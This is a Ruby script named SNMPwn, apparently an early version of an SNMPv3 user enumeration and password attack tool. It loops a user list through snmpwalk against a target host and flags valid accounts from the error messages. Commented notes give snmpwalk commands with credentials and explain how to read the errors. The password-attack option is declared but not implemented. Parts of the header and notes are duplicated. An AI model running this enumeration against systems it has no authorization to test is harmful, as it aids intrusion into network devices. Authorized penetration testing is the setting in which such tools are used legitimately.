#!/usr/bin/env ruby
#SNMPwn
#SNMPv3 User Enumeration and Password Attack Script

#!/usr/bin/env ruby
#SNMPwn
#SNMPv3 User Enumeration and Password Attack Script

require 'tty-command'
require 'trollop'
require 'colorize'
require 'logger'

def arguments

  opts = Trollop::options do 
    version "snmpwn v0.95b".light_blue
    banner <<-EOS
    snmpwn v0.95b
      EOS

        opt :host, "SNMPv3 Server IP", :type => String
        opt :enum_users, "Emumerate SNMPv3 Users?"
        opt :users, "List of users you want to try", :type => String
        opt :user, "Specify a single user to try", :type => String #probably remove this in favour of a list
        opt :auth, "SNMP Authentication and Encryption Type. Should be either: authnopriv, noauthnopriv or authpriv", :type => String
        opt :passlist, "Password list for attacks", :type => String
        opt :priv, "Privacy protocol, either AES or DES", :type => String

        if ARGV.empty?
          puts "Need Help? Try ./snmpwn --help".red.bold
        exit
      end
    end
  opts
end

def findusers(arg)
  users = []
  userfile = File.readlines(arg[:users]).map(&:chomp)
  cmd = TTY::Command.new(printer: :null)
  
  userfile.each do |user|
    out, err = cmd.run!("snmpwalk -u #{user} #{arg[:host]} iso.3.6.1.2.1.1.1.0")
      if out =~ /iso.3.6.1.2.1.1.1.0 = STRING:/i
        puts "Username: #{user} Is Valid".green.bold
        users << user
      elsif err =~ /authorizationError/i
        puts "Username: #{user} Is Valid".green.bold
        users << user
      elsif err =~ /snmpwalk: Unknown user name/
        puts "Username: #{user} Is Not Configured On This Host".red.bold
    end
  end
  puts "\nValid Users:".green.underline.bold + "\n#{users.join("\n")}".green
  users
end

# def findusers(arg)
#   users = []
#   # logs = Logger.new('snmp.log')
#   # cmd = TTY::Command.new(output: logs)
#   cmd = TTY::Command.new
#   command = cmd.run!("snmpwalk -u #{arg[:user]} #{arg[:host]} iso.3.6.1.2.1.1.1.0")
#     if command.out =~ /iso.3.6.1.2.1.1.1.0 = STRING:/i
#       puts "Username: #{arg[:user]} Is Valid".light_blue
#     elsif command.err =~ /Error in Packet/i
#       puts "Username: #{arg[:user]} Is Valid".light_blue
#     elsif command.out =~ /snmpwalk: Unknown user name/
#       puts "Username: #{arg[:user]} Is Not Configured On This Host"
#     # elsif command.failure?
#     puts "ERR: #{command.err}"
#     puts "OUT: #{command.out}"
#     # puts "User #{arg[:user]} does not exist"
#   # end
# end
#   # puts "Error: #{command.err}"
#   # puts "Result: #{command.out}"
# end


arg = arguments
findusers(arg)



#Commands:
#No auth just username
#snmpwalk -u user1 192.168.1.107 -v3 iso.3.6.1.2.1.1.1.0
#Authentication and encryption
#snmpwalk -u user2 -A password 192.168.1.107 -X password -v3 iso.3.6.1.2.1.1.1.0 -l authpriv
#Same again but this user was configured for RW - Is there a way to enumerate that?
#snmpwalk -u user3 -A password 192.168.1.107 -X password -v3 iso.3.6.1.2.1.1.1.0 -l authPriv

#Commands:
#No auth just username
#snmpwalk -u user1 192.168.1.107 -v3 iso.3.6.1.2.1.1.1.0
#Authentication and encryption
#snmpwalk -u user2 -A password 192.168.1.107 -X password -v3 iso.3.6.1.2.1.1.1.0 -l authpriv
#Same again but this user was configured for RW - Is there a way to enumerate that?
#snmpwalk -u user3 -A password 192.168.1.107 -X password -v3 iso.3.6.1.2.1.1.1.0 -l authPriv

#iso.3.6.1.2.1.1.1.0 = STRING: If the message returned contains this, the connection was succesful 
#LINUX ERRORS
#Error in packet.
#Reason: authorizationError (access denied to that object)
#Means the user exists but you don't have the right auth/encryption settings
#snmpwalk: Unknown user name - user doesnt exit

#---------------------------------------------------------
#Error in packet.
#Reason: authorizationError (access denied to that object)
#Failed object: iso.3.6.1.2.1.1.1.0
#this one means something was wrong with auth or crypto
#---------------------------------------------------------



